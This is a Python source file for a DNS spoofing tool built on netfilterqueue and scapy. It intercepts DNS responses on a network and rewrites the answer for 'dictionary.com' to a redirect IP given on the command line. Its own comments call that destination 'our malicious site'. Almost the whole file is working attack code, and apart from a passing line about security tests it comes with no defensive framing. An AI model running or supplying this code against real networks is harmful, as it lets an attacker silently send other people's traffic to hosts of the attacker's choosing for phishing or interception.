#!/usr/bin/env python

import argparse
import netfilterqueue
import scapy.all as scapy

"""
    Run the script by providing the required arguments in the following format:
    
    Usage:
      python dns_spoofer.py -r XXX.XXX.XXX.XXX
      
    A DNS spoofer Python script intercepts and alters DNS requests within a network. 
    It can trick computers into thinking they're accessing one site, when they're 
    actually being directed to another, typically used in network security tests 
    or malicious hacking.
    
    License:
        MIT License

        Copyright (c) 2023, WildBerry, LLC

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__ = "Marco A. Villarruel"
__authors__ = ["Marco A. Villarruel"]
__contacts__ = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__copyright__ = "Copyright 2023, WildBerry, LLC"
__credits__ = ["Marco A. Villarruel"]
__date__ = "2023/06/15"
__deprecated__ = False
__emails__ = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__license__ = "GPLv3"
__maintainer__ = "developer"
__status__ = "Production"
__version__ = "1.0.0"


def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)


def process_packet(packet, rdata):
    """Process each packet and spoof if the destination is the target site."""

    # Convert the raw packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet has a DNS response layer
    if scapy_packet.haslayer(scapy.DNSRR):

        # Extract the queried domain name
        qname = scapy_packet[scapy.DNSQR].qname

        # If the queried domain is our target domain
        if 'dictionary.com' in str(qname):
            print('[+] Spoofing target.')

            # Create a DNS response pointing to our malicious site
            answer = scapy.DNSRR(rrname=qname, rdata=rdata)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Delete the original checksums so scapy can recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set the packet payload to our modified version
            packet.set_payload(bytes(scapy_packet))

    # Forward the packet
    packet.accept()


def run_spoof(rdata):
    """Create a queue, bind it to the queue number where packets are being held and start the spoofing."""

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(packet, rdata))
    queue.run()


if __name__ == "__main__":
    logo()
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="DNS Spoofing Script")
    parser.add_argument("-r", "--rdata", dest="rdata", required=True,
                        help="The redirect IP for DNS Spoofing")
    args = parser.parse_args()

    # Run the spoofing attack with the provided redirect IP
    run_spoof(args.rdata)
